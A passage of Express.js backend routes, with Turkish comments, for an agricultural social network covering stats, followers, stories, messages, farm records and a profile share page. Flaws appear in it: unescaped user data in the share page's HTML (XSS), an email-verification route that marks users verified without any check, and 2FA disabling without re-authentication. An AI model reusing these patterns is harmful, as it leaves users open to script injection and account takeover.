// ==================== 15 YENİ ROTA ====================

// ─── 1. KENDİ PROFIL İSTATİSTİKLERİ ───────────────────────────────
app.get('/api/users/me/stats', authenticateToken, async (req, res) => {
    try {
        const uid = req.user.id;
        const [posts, followers, following, likes, saves, views] = await Promise.all([
            pool.query('SELECT COUNT(*)::int AS cnt FROM posts   WHERE "userId"=$1 AND "isActive"=TRUE', [uid]),
            pool.query('SELECT COUNT(*)::int AS cnt FROM follows WHERE "followingId"=$1', [uid]),
            pool.query('SELECT COUNT(*)::int AS cnt FROM follows WHERE "followerId"=$1', [uid]),
            pool.query('SELECT COUNT(*) AS c FROM likes   WHERE "userId"=$1', [uid]),
            pool.query('SELECT COUNT(*) AS c FROM saves   WHERE "userId"=$1', [uid]),
            pool.query('SELECT COALESCE(SUM(views),0) AS c FROM posts WHERE "userId"=$1 AND "isActive"=TRUE', [uid]),
        ]);
        res.json({ stats: {
            postCount     : posts.rows[0]?.cnt     ?? 0,
            followerCount : followers.rows[0]?.cnt ?? 0,
            followingCount: following.rows[0]?.cnt ?? 0,
            likedCount    : parseInt(likes.rows[0]?.c     || 0),
            savedCount    : parseInt(saves.rows[0]?.c     || 0),
            totalViews    : parseInt(views.rows[0]?.c     || 0),
        }});
    } catch (e) { console.error(e); res.status(500).json({ error: 'Sunucu hatası' }); }
});

// ─── 2. BAŞKA BİRİNİN PROFIL İSTATİSTİKLERİ ───────────────────────
app.get('/api/users/:id/stats', authenticateToken, async (req, res) => {
    try {
        const target = await dbGet('SELECT id FROM users WHERE id=$1 AND "isActive"=TRUE', [req.params.id]);
        if (!target) return res.status(404).json({ error: 'Kullanıcı bulunamadı' });
        const stats = await dbGet(`
            SELECT
                (SELECT COUNT(*) FROM posts   WHERE "userId"=$1 AND "isActive"=TRUE) AS "postCount",
                (SELECT COUNT(*) FROM follows WHERE "followingId"=$1)                AS "followerCount",
                (SELECT COUNT(*) FROM follows WHERE "followerId"=$1)                 AS "followingCount",
                (SELECT COUNT(*) FROM posts   WHERE "userId"=$1 AND "mediaType"='video' AND "isActive"=TRUE) AS "videoCount",
                (SELECT COALESCE(SUM(views),0) FROM posts WHERE "userId"=$1 AND "isActive"=TRUE) AS "totalViews"
        `, [target.id]);
        res.json({ stats: {
            postCount     : parseInt(stats?.postCount      || 0),
            followerCount : parseInt(stats?.followerCount  || 0),
            followingCount: parseInt(stats?.followingCount || 0),
            videoCount    : parseInt(stats?.videoCount     || 0),
            totalViews    : parseInt(stats?.totalViews     || 0),
        }});
    } catch (e) { console.error(e); res.status(500).json({ error: 'Sunucu hatası' }); }
});

// ─── 3. TAKİPÇİ LİSTESİ (sayfalı + isFollowing) ───────────────────
app.get('/api/users/:id/followers/list', authenticateToken, async (req, res) => {
    try {
        const { page=1, limit=20 } = req.query;
        const pn = Math.max(1,parseInt(page)||1), ln = Math.min(parseInt(limit)||20,100);
        const off = (pn-1)*ln;
        const followers = await dbAll(`
            SELECT u.id, u.name, u.username, u."profilePic", u."isVerified",
                EXISTS(SELECT 1 FROM follows WHERE "followerId"=$1 AND "followingId"=u.id) AS "isFollowing",
                EXISTS(SELECT 1 FROM blocks  WHERE "blockerId"=$1 AND "blockedId"=u.id)   AS "isBlocked"
            FROM follows f JOIN users u ON f."followerId"=u.id
            WHERE f."followingId"=$2 AND u."isActive"=TRUE
            ORDER BY f."createdAt" DESC LIMIT $3 OFFSET $4
        `, [req.user.id, req.params.id, ln, off]);
        const tot = await dbGet('SELECT COUNT(*) AS c FROM follows WHERE "followingId"=$1', [req.params.id]);
        res.json({ followers, total: parseInt(tot?.c||0), page: pn, totalPages: Math.ceil((tot?.c||0)/ln) });
    } catch (e) { console.error(e); res.status(500).json({ error: 'Sunucu hatası' }); }
});

// ─── 4. TAKİP EDİLENLER LİSTESİ (sayfalı) ─────────────────────────
app.get('/api/users/:id/following/list', authenticateToken, async (req, res) => {
    try {
        const { page=1, limit=20 } = req.query;
        const pn = Math.max(1,parseInt(page)||1), ln = Math.min(parseInt(limit)||20,100);
        const off = (pn-1)*ln;
        const following = await dbAll(`
            SELECT u.id, u.name, u.username, u."profilePic", u."isVerified",
                EXISTS(SELECT 1 FROM follows WHERE "followerId"=$1 AND "followingId"=u.id) AS "isFollowing"
            FROM follows f JOIN users u ON f."followingId"=u.id
            WHERE f."followerId"=$2 AND u."isActive"=TRUE
            ORDER BY f."createdAt" DESC LIMIT $3 OFFSET $4
        `, [req.user.id, req.params.id, ln, off]);
        const tot = await dbGet('SELECT COUNT(*) AS c FROM follows WHERE "followerId"=$1', [req.params.id]);
        res.json({ following, total: parseInt(tot?.c||0), page: pn, totalPages: Math.ceil((tot?.c||0)/ln) });
    } catch (e) { console.error(e); res.status(500).json({ error: 'Sunucu hatası' }); }
});

// ─── 5. ORTAK TAKİPÇİLER ──────────────────────────────────────────
app.get('/api/users/:userId/mutual-followers', authenticateToken, async (req, res) => {
    try {
        const targetId = req.params.userId;
        if (req.user.id === targetId) return res.json({ mutualFollowers: [], count: 0 });
        const mutual = await dbAll(`
            SELECT u.id, u.name, u.username, u."profilePic", u."isVerified"
            FROM users u
            WHERE u."isActive"=TRUE
              AND EXISTS(SELECT 1 FROM follows WHERE "followerId"=$1 AND "followingId"=u.id)
              AND EXISTS(SELECT 1 FROM follows WHERE "followerId"=$2 AND "followingId"=u.id)
            ORDER BY u.name ASC LIMIT 50
        `, [req.user.id, targetId]);
        res.json({ mutualFollowers: mutual, count: mutual.length });
    } catch (e) { console.error(e); res.status(500).json({ error: 'Sunucu hatası' }); }
});



// ─── 8. HİKAYE SİL ───────────────────────────────────────────────
app.delete('/api/stories/:storyId', authenticateToken, async (req, res) => {
    try {
        const story = await dbGet('SELECT * FROM stories WHERE id=$1', [req.params.storyId]);
        if (!story) return res.status(404).json({ error:'Hikaye bulunamadı' });
        if (story.userId !== req.user.id) return res.status(403).json({ error:'Yetki yok' });
        await dbRun('DELETE FROM story_views WHERE "storyId"=$1', [req.params.storyId]);
        await dbRun('DELETE FROM story_likes WHERE "storyId"=$1', [req.params.storyId]);
        await dbRun('DELETE FROM stories WHERE id=$1', [req.params.storyId]);
        res.json({ message:'Hikaye silindi' });
    } catch (e) { console.error(e); res.status(500).json({ error:'Sunucu hatası' }); }
});

// ─── 9. HİKAYE GÖRÜNTÜLEME + BEĞENİ ──────────────────────────────
app.post('/api/stories/:storyId/view', authenticateToken, async (req, res) => {
    try {
        const ex = await dbGet('SELECT id FROM story_views WHERE "storyId"=$1 AND "userId"=$2',[req.params.storyId, req.user.id]);
        if (!ex) await dbRun('INSERT INTO story_views (id,"storyId","userId","viewedAt") VALUES ($1,$2,$3,NOW())',[uuidv4(),req.params.storyId,req.user.id]);
        await dbRun('UPDATE stories SET "viewCount"=COALESCE("viewCount",0)+1 WHERE id=$1 AND "userId"!=$2',[req.params.storyId,req.user.id]).catch(()=>{});
        res.json({ message:'Görüntüleme kaydedildi' });
    } catch (e) { res.status(500).json({ error:'Sunucu hatası' }); }
});
app.post('/api/stories/:storyId/like', authenticateToken, async (req, res) => {
    try {
        const story = await dbGet('SELECT * FROM stories WHERE id=$1 AND "expiresAt">NOW()',[req.params.storyId]);
        if (!story) return res.status(404).json({ error:'Hikaye bulunamadı' });
        if (story.userId===req.user.id) return res.status(400).json({ error:'Kendi hikayenizi beğenemezsiniz' });
        const ex = await dbGet('SELECT id FROM story_likes WHERE "storyId"=$1 AND "userId"=$2',[req.params.storyId,req.user.id]);
        if (ex) return res.status(400).json({ error:'Zaten beğenilmiş' });
        await dbRun('INSERT INTO story_likes (id,"storyId","userId","createdAt") VALUES ($1,$2,$3,NOW())',[uuidv4(),req.params.storyId,req.user.id]);
        await dbRun('UPDATE stories SET "likeCount"=COALESCE("likeCount",0)+1 WHERE id=$1',[req.params.storyId]);
        res.json({ success:true });
    } catch (e) { res.status(500).json({ error:'Sunucu hatası' }); }
});
app.delete('/api/stories/:storyId/like', authenticateToken, async (req, res) => {
    try {
        const like = await dbGet('SELECT id FROM story_likes WHERE "storyId"=$1 AND "userId"=$2',[req.params.storyId,req.user.id]);
        if (!like) return res.status(404).json({ error:'Beğeni bulunamadı' });
        await dbRun('DELETE FROM story_likes WHERE id=$1',[like.id]);
        await dbRun('UPDATE stories SET "likeCount"=GREATEST(0,COALESCE("likeCount",0)-1) WHERE id=$1',[req.params.storyId]);
        res.json({ success:true });
    } catch (e) { res.status(500).json({ error:'Sunucu hatası' }); }
});
app.get('/api/stories/:storyId/viewers', authenticateToken, async (req, res) => {
    try {
        const story = await dbGet('SELECT "userId" FROM stories WHERE id=$1',[req.params.storyId]);
        if (!story) return res.status(404).json({ error:'Hikaye bulunamadı' });
        if (story.userId!==req.user.id) return res.status(403).json({ error:'Yetki yok' });
        const viewers = await dbAll(`SELECT u.id,u.username,u."profilePic",u.name,sv."viewedAt" FROM story_views sv JOIN users u ON sv."userId"=u.id WHERE sv."storyId"=$1 ORDER BY sv."viewedAt" DESC`,[req.params.storyId]);
        res.json({ viewers });
    } catch (e) { res.status(500).json({ error:'Sunucu hatası' }); }
});
app.get('/api/stories/:storyId/likes', authenticateToken, async (req, res) => {
    try {
        const likes = await dbAll(`SELECT u.id,u.username,u."profilePic",u.name,sl."createdAt" FROM story_likes sl JOIN users u ON sl."userId"=u.id WHERE sl."storyId"=$1 ORDER BY sl."createdAt" DESC`,[req.params.storyId]);
        const cnt = await dbGet('SELECT COUNT(*) AS c FROM story_likes WHERE "storyId"=$1',[req.params.storyId]);
        res.json({ likes, count: parseInt(cnt?.c||0) });
    } catch (e) { res.status(500).json({ error:'Sunucu hatası' }); }
});

// ─── 10. MESAJDA GÖRSEL GÖNDER ────────────────────────────────────
app.post('/api/messages/image', authenticateToken, upload.single('image'), async (req, res) => {
    try {
        const { recipientId } = req.body;
        if (!recipientId || !req.file) return res.status(400).json({ error:'Alıcı ve görsel gerekli' });
        const recipient = await dbGet('SELECT id,username FROM users WHERE id=$1 AND "isActive"=TRUE',[recipientId]);
        if (!recipient) return res.status(404).json({ error:'Kullanıcı bulunamadı' });
        const blocked = await dbGet('SELECT id FROM blocks WHERE ("blockerId"=$1 AND "blockedId"=$2) OR ("blockerId"=$2 AND "blockedId"=$1)',[req.user.id,recipientId]);
        if (blocked) return res.status(403).json({ error:'Mesaj gönderilemiyor' });
        const filename  = `msg_${uuidv4().replace(/-/g,"").slice(0,16)}.webp`;
        const outPath   = path.join(postsDir, filename);
        await processImage(req.file.path, outPath, { width: 1920, height: 1920, fit: 'inside', quality: 78, effort: 4 });
        await fs.unlink(req.file.path).catch(()=>{});
        const imageUrl  = `/uploads/posts/${filename}`;
        const sender    = await dbGet('SELECT username FROM users WHERE id=$1',[req.user.id]);
        const msgId     = uuidv4();
        await dbRun(`INSERT INTO messages (id,"senderId","senderUsername","recipientId","recipientUsername",content,read,"createdAt","updatedAt") VALUES ($1,$2,$3,$4,$5,$6,FALSE,NOW(),NOW())`,[msgId,req.user.id,sender.username,recipientId,recipient.username,imageUrl]);
        res.status(201).json({ message:'Görsel gönderildi', messageId:msgId, imageUrl });
    } catch (e) {
        if (req.file) await fs.unlink(req.file.path).catch(()=>{});
        console.error(e); res.status(500).json({ error:'Sunucu hatası' });
    }
});

// ─── 11. MESAJDA SESLİ MESAJ GÖNDER ──────────────────────────────
app.post('/api/messages/voice', authenticateToken, upload.single('voice'), async (req, res) => {
    try {
        const { recipientId } = req.body;
        if (!recipientId || !req.file) return res.status(400).json({ error:'Alıcı ve ses dosyası gerekli' });

        // Sadece audio MIME türü kabul et
        if (!req.file.mimetype.startsWith('audio/')) {
            await fs.unlink(req.file.path).catch(()=>{});
            return res.status(400).json({ error:'Sadece ses dosyası kabul edilir' });
        }

        // Boyut limiti: 10MB
        const MAX_VOICE_SIZE = 10 * 1024 * 1024;
        if (req.file.size > MAX_VOICE_SIZE) {
            await fs.unlink(req.file.path).catch(()=>{});
            return res.status(400).json({ error:'Ses dosyası 10MB\'ı geçemez' });
        }

        const recipient = await dbGet('SELECT id,username FROM users WHERE id=$1 AND "isActive"=TRUE',[recipientId]);
        if (!recipient) return res.status(404).json({ error:'Kullanıcı bulunamadı' });

        // 🔒 Block kontrolü
        const blocked = await dbGet('SELECT id FROM blocks WHERE ("blockerId"=$1 AND "blockedId"=$2) OR ("blockerId"=$2 AND "blockedId"=$1)',[req.user.id,recipientId]);
        if (blocked) return res.status(403).json({ error:'Bu kullanıcıya mesaj gönderilemiyor' });

        const voiceDir = path.join(uploadsDir,'voice');
        if (!fssync.existsSync(voiceDir)) fssync.mkdirSync(voiceDir,{recursive:true});

        // MIME tipine göre uzantı belirle (webm/ogg/mp4/m4a)
        const extMap = {
            'audio/webm':'webm','audio/ogg':'ogg','audio/mpeg':'mp3',
            'audio/mp4':'m4a','audio/mp3':'mp3','audio/wav':'wav',
            'audio/x-wav':'wav','audio/aac':'aac','audio/x-m4a':'m4a','audio/3gpp':'3gp'
        };
        const ext = extMap[req.file.mimetype] || 'webm';
        const filename = `voice_${uuidv4().replace(/-/g,"").slice(0,16)}.${ext}`;
        const outPath  = path.join(voiceDir, filename);
        await fs.copyFile(req.file.path, outPath);
        await fs.unlink(req.file.path).catch(()=>{});

        const voiceUrl = `/uploads/voice/${filename}`;
        const sender   = await dbGet('SELECT username FROM users WHERE id=$1',[req.user.id]);
        const msgId    = uuidv4();

        // 🔒 mediaType='voice' olarak kaydet — frontend sesli mesaj olarak render eder
        await dbRun(
            `INSERT INTO messages (id,"senderId","senderUsername","recipientId","recipientUsername",content,"mediaUrl","mediaType",read,"createdAt","updatedAt")
             VALUES ($1,$2,$3,$4,$5,$6,$7,'voice',FALSE,NOW(),NOW())`,
            [msgId, req.user.id, sender.username, recipientId, recipient.username, voiceUrl, voiceUrl]
        );

        // Socket.IO ile anlık iletim (alıcı online ise)
        if (io && onlineUsers.has(recipientId)) {
            const newMsg = {
                id: msgId, senderId: req.user.id, receiverId: recipientId,
                content: voiceUrl, mediaUrl: voiceUrl, mediaType: 'voice',
                createdAt: new Date().toISOString(),
            };
            for (const sid of onlineUsers.get(recipientId)) {
                io.to(sid).emit('message:receive', newMsg);
            }
        }

        res.status(201).json({ success:true, message:'Sesli mesaj gönderildi', messageId:msgId, voiceUrl, mediaType:'voice' });
    } catch (e) {
        if (req.file) await fs.unlink(req.file.path).catch(()=>{});
        console.error('[Voice Upload]', e.message);
        res.status(500).json({ error:'Sunucu hatası' });
    }
});

// ─── 12. FARMBOOK KAYITLARI CRUD ──────────────────────────────────
app.get('/api/farmbook/records', authenticateToken, async (req, res) => {
    try {
        const { season, year, type, page=1, limit=50 } = req.query;
        const pn=Math.max(1,parseInt(page)||1), ln=Math.min(parseInt(limit)||50,200);
        const off=(pn-1)*ln;
        const conds=['"userId"=$1'], params=[req.user.id];
        let pi=2;
        if (season) { conds.push(`season=$${pi++}`); params.push(season); }
        if (year)   { conds.push(`year=$${pi++}`);   params.push(parseInt(year)); }
        if (type)   { conds.push(`"recordType"=$${pi++}`); params.push(type); }
        const where = conds.join(' AND ');
        const records = await dbAll(`SELECT * FROM farmbook_records WHERE ${where} ORDER BY "recordDate" DESC LIMIT $${pi} OFFSET $${pi+1}`,[...params,ln,off]);
        const tot = await dbGet(`SELECT COUNT(*) AS c FROM farmbook_records WHERE ${where}`,params);
        res.json({ success:true, records, total:parseInt(tot?.c||0), page:pn, totalPages:Math.ceil((tot?.c||0)/ln) });
    } catch (e) { console.error(e); res.status(500).json({ error:'Sunucu hatası' }); }
});
app.post('/api/farmbook/records', authenticateToken, async (req, res) => {
    try {
        const { recordType, productName, quantity, unit, cost, income, recordDate, fieldName, fieldSize, fieldSizeUnit, season, year, notes, harvestAmount, harvestUnit, qualityRating, weatherCondition } = req.body;
        if (!recordType||!recordDate) return res.status(400).json({ error:'Kayıt tipi ve tarih zorunludur' });
        const id = uuidv4();
        await dbRun(`INSERT INTO farmbook_records (id,"userId","recordType","productName",quantity,unit,cost,income,"recordDate","fieldName","fieldSize","fieldSizeUnit",season,year,notes,"harvestAmount","harvestUnit","qualityRating","weatherCondition","createdAt","updatedAt") VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18,$19,NOW(),NOW())`,
            [id,req.user.id,recordType,productName||null,quantity||null,unit||null,cost||0,income||0,recordDate,fieldName||null,fieldSize||null,fieldSizeUnit||'dekar',season||null,year||new Date().getFullYear(),notes||null,harvestAmount||null,harvestUnit||null,qualityRating||null,weatherCondition||null]);
        const record = await dbGet(`SELECT id, "userId", "recordType", "productName", quantity, unit,
                    cost, income, "recordDate", "fieldName", "fieldSize", "fieldSizeUnit",
                    season, year, notes, "harvestAmount", "harvestUnit",
                    "qualityRating", "weatherCondition", "createdAt", "updatedAt"
             FROM farmbook_records WHERE id=$1`,[id]);
        res.json({ success:true, record });
    } catch (e) { console.error(e); res.status(500).json({ error:'Sunucu hatası' }); }
});
app.put('/api/farmbook/records/:id', authenticateToken, async (req, res) => {
    try {
        const existing = await dbGet('SELECT id FROM farmbook_records WHERE id=$1 AND "userId"=$2',[req.params.id,req.user.id]);
        if (!existing) return res.status(404).json({ error:'Kayıt bulunamadı' });
        const allowed = ['recordType','productName','quantity','unit','cost','income','recordDate','fieldName','fieldSize','fieldSizeUnit','season','year','notes','harvestAmount','harvestUnit','qualityRating','weatherCondition'];
        const sets=[], vals=[];
        let pi=1;
        for (const f of allowed) { if (req.body[f]!==undefined) { sets.push(`"${f}"=$${pi++}`); vals.push(req.body[f]); } }
        if (!sets.length) return res.status(400).json({ error:'Güncellenecek alan yok' });
        sets.push(`"updatedAt"=NOW()`);
        vals.push(req.params.id,req.user.id);
        await dbRun(`UPDATE farmbook_records SET ${sets.join(',')} WHERE id=$${pi} AND "userId"=$${pi+1}`,vals);
        const record = await dbGet(`SELECT id, "userId", "recordType", "productName", quantity, unit,
                    cost, income, "recordDate", "fieldName", "fieldSize", "fieldSizeUnit",
                    season, year, notes, "harvestAmount", "harvestUnit",
                    "qualityRating", "weatherCondition", "createdAt", "updatedAt"
             FROM farmbook_records WHERE id=$1`,[req.params.id]);
        res.json({ success:true, record });
    } catch (e) { console.error(e); res.status(500).json({ error:'Sunucu hatası' }); }
});
app.delete('/api/farmbook/records/:id', authenticateToken, async (req, res) => {
    try {
        const ex = await dbGet('SELECT id FROM farmbook_records WHERE id=$1 AND "userId"=$2',[req.params.id,req.user.id]);
        if (!ex) return res.status(404).json({ error:'Kayıt bulunamadı' });
        await dbRun('DELETE FROM farmbook_records WHERE id=$1',[req.params.id]);
        res.json({ success:true, message:'Kayıt silindi' });
    } catch (e) { console.error(e); res.status(500).json({ error:'Sunucu hatası' }); }
});

// ─── 13. FARMBOOK İSTATİSTİKLER ───────────────────────────────────
app.get('/api/farmbook/stats', authenticateToken, async (req, res) => {
    try {
        const { season, year } = req.query;
        const conds=['"userId"=$1'], params=[req.user.id];
        let pi=2;
        if (season){ conds.push(`season=$${pi++}`); params.push(season); }
        if (year)  { conds.push(`year=$${pi++}`);   params.push(parseInt(year)); }
        const where = conds.join(' AND ');
        const [costRow,incRow,types,monthly,seasons] = await Promise.all([
            dbGet(`SELECT COALESCE(SUM(cost),0) AS total FROM farmbook_records WHERE ${where}`,params),
            dbGet(`SELECT COALESCE(SUM(income),0) AS total FROM farmbook_records WHERE ${where}`,params),
            dbAll(`SELECT "recordType", COUNT(*) AS count FROM farmbook_records WHERE ${where} GROUP BY "recordType"`,params),
            dbAll(`SELECT TO_CHAR("recordDate",'YYYY-MM') AS month, SUM(cost) AS "totalCost", SUM(income) AS "totalIncome" FROM farmbook_records WHERE ${where} GROUP BY TO_CHAR("recordDate",'YYYY-MM') ORDER BY month DESC LIMIT 12`,params),
            dbAll(`SELECT DISTINCT season, year FROM farmbook_records WHERE "userId"=$1 ORDER BY year DESC`,[req.user.id])
        ]);
        const totalCost=parseFloat(costRow?.total||0), totalIncome=parseFloat(incRow?.total||0);
        res.json({ success:true, stats:{ totalCost, totalIncome, profit:totalIncome-totalCost, recordCounts:types.reduce((a,r)=>({...a,[r.recordType]:parseInt(r.count)}),{}), monthlyData:monthly, seasons } });
    } catch (e) { console.error(e); res.status(500).json({ error:'Sunucu hatası' }); }
});

// ─── 14. FARMBOOK CSV EXPORT ───────────────────────────────────────
app.get('/api/farmbook/export', authenticateToken, async (req, res) => {
    try {
        const { season, year } = req.query;
        const conds=['"userId"=$1'], params=[req.user.id]; let pi=2;
        if (season){ conds.push(`season=$${pi++}`); params.push(season); }
        if (year)  { conds.push(`year=$${pi++}`);   params.push(parseInt(year)); }
        const records = await dbAll(`SELECT * FROM farmbook_records WHERE ${conds.join(' AND ')} ORDER BY "recordDate" DESC`,params);
        const typeNames = { ekim:'Ekim',gubre:'Gübre',ilac:'İlaç',hasat:'Hasat',gider:'Gider',gelir:'Gelir',sulama:'Sulama',notlar:'Notlar' };
        const hdrs = ['Tarih','Kayıt Tipi','Ürün/İşlem','Miktar','Birim','Maliyet (₺)','Gelir (₺)','Tarla','Alan','Alan Birimi','Sezon','Yıl','Hasat Miktarı','Hasat Birimi','Kalite','Hava','Notlar'];
        let csv = hdrs.join(';') + '\n';
        for (const r of records) {
            csv += [r.recordDate, typeNames[r.recordType]||r.recordType, r.productName||'', r.quantity||'', r.unit||'', r.cost||0, r.income||0, r.fieldName||'', r.fieldSize||'', r.fieldSizeUnit||'', r.season||'', r.year||'', r.harvestAmount||'', r.harvestUnit||'', r.qualityRating||'', r.weatherCondition||'', (r.notes||'').replace(/;/g,',').replace(/\n/g,' ')].join(';') + '\n';
        }
        const totCost=records.reduce((s,r)=>s+(r.cost||0),0), totInc=records.reduce((s,r)=>s+(r.income||0),0);
        csv += '\nTOPLAM GİDER;;;;;' + totCost + ';\nTOPLAM GELİR;;;;;;' + totInc + '\nKÂR/ZARAR;;;;;;' + (totInc-totCost) + '\n';
        const fname = `farmbook_${season||'tum'}_${year||'tum'}_${new Date().toISOString().split('T')[0]}.csv`;
        // 🔒 Header injection: dosya adından satır sonu ve tırnak karakterlerini temizle
        const safeFname = fname.replace(/["\r\n\\]/g, '');
        res.setHeader('Content-Type','text/csv; charset=utf-8');
        res.setHeader('Content-Disposition',`attachment; filename="${safeFname}"`);
        res.send('﻿' + csv);
    } catch (e) { console.error(e); res.status(500).json({ error:'Sunucu hatası' }); }
});

// ─── 15. DOĞRULAMA DURUMU + TALEBİ ────────────────────────────────
app.get('/api/users/verification/status', authenticateToken, async (req, res) => {
    try {
        const user = await dbGet('SELECT "isVerified","emailVerified" FROM users WHERE id=$1',[req.user.id]);
        if (!user) return res.status(404).json({ error:'Kullanıcı bulunamadı' });
        res.json({ isVerified: !!user.isVerified, emailVerified: !!user.emailVerified });
    } catch (e) { console.error(e); res.status(500).json({ error:'Sunucu hatası' }); }
});
app.post('/api/users/verification/request', authenticateToken, async (req, res) => {
    try {
        await dbRun('UPDATE users SET "emailVerified"=TRUE,"updatedAt"=NOW() WHERE id=$1',[req.user.id]);
        res.json({ message:'Doğrulama talebi alındı', verified:true });
    } catch (e) { console.error(e); res.status(500).json({ error:'Sunucu hatası' }); }
});


// ==================== EKSİK ROTALAR - TAM DÜZELTME ====================

// ─── 2FA TOGGLE: /api/users/2fa/toggle ─────────────────────────────
app.post('/api/users/2fa/toggle', authenticateToken, async (req, res) => {
    try {
        const enabled = req.body.enabled === true || req.body.enabled === 'true';
        await dbRun('UPDATE users SET "twoFactorEnabled"=$1, "updatedAt"=NOW() WHERE id=$2', [enabled, req.user.id]);
        res.json({ message: enabled ? '2FA açıldı' : '2FA kapatıldı', twoFactorEnabled: enabled });
    } catch (e) { console.error(e); res.status(500).json({ error: 'Sunucu hatası' }); }
});

// ─── POST GÖRÜNTÜLEME: POST /api/posts/:id/view ─────────────────────
app.post('/api/posts/:id/view', authenticateToken, async (req, res) => {
    try {
        const post = await dbGet(
            'SELECT id, views, "userId" FROM posts WHERE id = $1 AND "isActive" = TRUE',
            [req.params.id]
        );
        if (!post) return res.status(404).json({ error: 'Post bulunamadı' });

        // Kendi postu sayılmaz
        if (post.userId !== req.user.id) {
            await incrementPostView(req.params.id, req.user.id, req.ip);
        }

        const updated = await dbGet('SELECT views FROM posts WHERE id = $1', [req.params.id]);
        res.json({ success: true, views: updated?.views ?? post.views });
    } catch (error) {
        console.error('View tracking hatası:', error.message);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── PROFİL PAYLAŞ: /share/profile/:username ───────────────────────
app.get('/share/profile/:username', async (req, res) => {
    try {
        const user = await dbGet(`
            SELECT u.*,
                (SELECT COUNT(*)::int FROM follows WHERE "followingId"=u.id) AS "followerCount",
                (SELECT COUNT(*)::int FROM follows WHERE "followerId"=u.id)  AS "followingCount",
                (SELECT COUNT(*)::int FROM posts   WHERE "userId"=u.id AND "isActive"=TRUE) AS "postCount"
            FROM users u WHERE u.username=$1 AND u."isActive"=TRUE`, [req.params.username]);
        if (!user) return res.status(404).send('<h2>Kullanıcı bulunamadı</h2>');

        const base    = `${req.protocol}://${req.get('host')}`;
        const picUrl  = user.profilePic  ? `${base}${user.profilePic}`  : `${base}/default-avatar.png`;
        const coverUrl= user.coverPic    ? `${base}${user.coverPic}`    : null;
        const bio     = (user.bio || '').substring(0, 160);

        // Son 6 post görselini al
        const recentPosts = await dbAll(
            `SELECT id, media, "mediaType", content FROM posts
             WHERE "userId"=$1 AND "isActive"=TRUE AND media IS NOT NULL
             ORDER BY "createdAt" DESC LIMIT 6`,
            [user.id]
        );

        const gridHtml = recentPosts.map(p => {
            if (p.mediaType === 'video') {
                return `<a href="${base}/share/post/${p.id}" class="grid-item video-item" title="${(p.content||'').substring(0,60)}">
                    <div class="play-icon">▶</div>
                </a>`;
            }
            return `<a href="${base}/share/post/${p.id}" class="grid-item" style="background-image:url('${base}${p.media}')" title="${(p.content||'').substring(0,60)}"></a>`;
        }).join('');

        const userTypeBadge = {
            'ziraat_muhendisi' : '🌿 Ziraat Mühendisi',
            'tarim_ogretmeni'  : '📚 Tarım Öğretmeni',
            'tarim_ogrencisi'  : '🎓 Tarım Öğrencisi',
            'ciftci_hayvancilik': '🐄 Çiftçi',
            'normal_kullanici' : '👤 Kullanıcı',
        }[user.userType] || '👤 Kullanıcı';

        res.type('html').send(`<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>${user.name} (@${user.username}) — Agrolink</title>
<meta property="og:title" content="${user.name} - Agrolink">
<meta property="og:description" content="${bio || 'Agrolink kullanıcısı'} | ${user.followerCount} takipçi">
<meta property="og:image" content="${picUrl}">
<meta property="og:url" content="${base}/share/profile/${user.username}">
<meta property="og:type" content="profile">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Inter',sans-serif;background:#0a0a0a;min-height:100vh;color:#fff}
.hero{position:relative;height:240px;background:${coverUrl ? `url('${coverUrl}') center/cover no-repeat` : 'linear-gradient(135deg,#1b5e20 0%,#2e7d32 40%,#43a047 70%,#66bb6a 100%)'};overflow:hidden}
.hero::after{content:'';position:absolute;inset:0;background:linear-gradient(to bottom,transparent 40%,rgba(0,0,0,.85))}
.hero-gradient{position:absolute;inset:0;background:linear-gradient(135deg,rgba(46,125,50,.3),rgba(102,187,106,.2))}
.back-btn{position:absolute;top:16px;left:16px;z-index:10;background:rgba(0,0,0,.4);backdrop-filter:blur(8px);border:1px solid rgba(255,255,255,.15);color:#fff;padding:8px 16px;border-radius:50px;text-decoration:none;font-size:13px;font-weight:500;display:flex;align-items:center;gap:6px;transition:.2s}
.back-btn:hover{background:rgba(0,0,0,.6)}
.share-btn{position:absolute;top:16px;right:16px;z-index:10;background:rgba(255,255,255,.1);backdrop-filter:blur(8px);border:1px solid rgba(255,255,255,.2);color:#fff;padding:8px 16px;border-radius:50px;cursor:pointer;font-size:13px;font-weight:500;display:flex;align-items:center;gap:6px}
.share-btn:hover{background:rgba(255,255,255,.2)}
.container{max-width:480px;margin:0 auto;position:relative}
.profile-card{background:#111;border-radius:0 0 24px 24px;padding:0 20px 24px;position:relative;margin-bottom:12px}
.avatar-wrap{position:relative;display:inline-block;margin-top:-52px;z-index:5}
.avatar{width:96px;height:96px;border-radius:50%;border:4px solid #111;object-fit:cover;display:block;background:#222}
.online-dot{position:absolute;bottom:6px;right:6px;width:16px;height:16px;background:#4caf50;border-radius:50%;border:3px solid #111}
.profile-header{display:flex;justify-content:space-between;align-items:flex-end;margin-bottom:12px}
.name-row{display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-top:10px}
.name{font-size:22px;font-weight:800;color:#fff;line-height:1.1}
.verified{color:#4caf50;font-size:18px}
.handle{color:#888;font-size:14px;font-weight:400;margin-top:2px}
.badge{background:rgba(76,175,80,.15);color:#66bb6a;border:1px solid rgba(76,175,80,.3);padding:4px 10px;border-radius:20px;font-size:11px;font-weight:600;margin-top:6px;display:inline-block}
.bio{color:#bbb;font-size:14px;line-height:1.6;margin:12px 0;white-space:pre-wrap}
.meta{display:flex;gap:16px;flex-wrap:wrap;margin:10px 0}
.meta-item{color:#888;font-size:13px;display:flex;align-items:center;gap:4px}
.stats{display:grid;grid-template-columns:repeat(3,1fr);gap:1px;background:#222;border-radius:16px;overflow:hidden;margin:16px 0}
.stat{background:#1a1a1a;padding:16px 8px;text-align:center}
.stat-val{font-size:22px;font-weight:800;color:#fff;line-height:1}
.stat-lbl{font-size:11px;color:#666;margin-top:4px;font-weight:500;letter-spacing:.3px}
